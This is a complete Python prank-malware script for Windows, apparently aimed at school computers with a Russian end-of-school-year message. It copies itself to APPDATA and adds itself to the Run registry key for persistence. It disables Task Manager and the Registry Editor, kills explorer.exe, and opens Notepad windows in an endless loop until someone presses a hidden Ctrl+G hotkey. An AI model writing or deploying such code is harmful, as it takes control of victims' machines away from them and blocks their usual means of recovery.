import os
import sys
import shutil
import winreg
import subprocess
import time
import tempfile
import keyboard
import ctypes

running = True
autostart_path = os.path.join(os.getenv("APPDATA"), "VeryFuNNYScript.pyw")


def add_to_autostart():
    current_script = os.path.abspath(sys.argv[0])
    global autostart_path

    if os.path.abspath(current_script).lower() != os.path.abspath(autostart_path).lower():
        try:
            shutil.copy(current_script, autostart_path)
        except Exception:
            if not os.path.exists(autostart_path):
                autostart_path = current_script

    reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "FunScript"

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{autostart_path}"')
    except Exception:
        pass


def remove_from_autostart():
    reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "FunScript"

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, value_name)
    except:
        pass


def disable_task_manager():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        subprocess.call(["taskkill", "/f", "/im", "explorer.exe"], shell=True)
    except:
        pass


def disable_regedit():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
    except:
        pass


def enable_task_manager_and_regedit():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except FileNotFoundError:
                pass
            try:
                winreg.DeleteValue(key, "DisableRegistryTools")
            except FileNotFoundError:
                pass
    except:
        pass


def delete_autostart_copy():
    try:
        current_script = os.path.abspath(sys.argv[0])
        if os.path.abspath(current_script).lower() != os.path.abspath(autostart_path).lower():
            if os.path.exists(autostart_path):
                os.remove(autostart_path)
    except:
        pass


def show_message_box():
    ctypes.windll.user32.MessageBoxW(
        0,
        "VeryFuNNy",
        "Info",
        0x40 | 0x1000
    )


def restart_explorer():
    try:
        os.startfile("explorer.exe")
    except:
        pass


def stop_script():
    global running
    running = False
    enable_task_manager_and_regedit()
    remove_from_autostart()
    delete_autostart_copy()
    show_message_box()
    time.sleep(1.5) 
    restart_explorer()


def main():
    global running

    add_to_autostart()
    disable_task_manager()
    disable_regedit()

    try:
        keyboard.add_hotkey('ctrl+g', stop_script)
    except:
        pass

    text_to_write = (
        "Вот и наступает долгожданный конец учебного года."
        "Добрый аноним, который решил проявить инициативу, крайне креативно и по-тёплому отнёсся к этой знаменательной дате."
        "И результат труда данной персоны вы незамедлительно можете лицезреть."
        "Это будет легендарно, закрепившись навсегда в наших сердцах."
        "Удачи вам на летних каникулах!"
        "P.S: И со сдачей экзаменов — сил и терпения!"
    )

    while running:
        try:
            with tempfile.NamedTemporaryFile(delete=False, mode="w", encoding="utf-8", suffix=".txt", prefix="Trolled_") as tmp_file:
                tmp_file.write(text_to_write)
                temp_file_path = tmp_file.name

            subprocess.Popen(["notepad.exe", temp_file_path])
            time.sleep(0.1)
        except:
            time.sleep(1)

    try:
        keyboard.unhook_all_hotkeys()
    except:
        pass


if __name__ == "__main__":
    main()
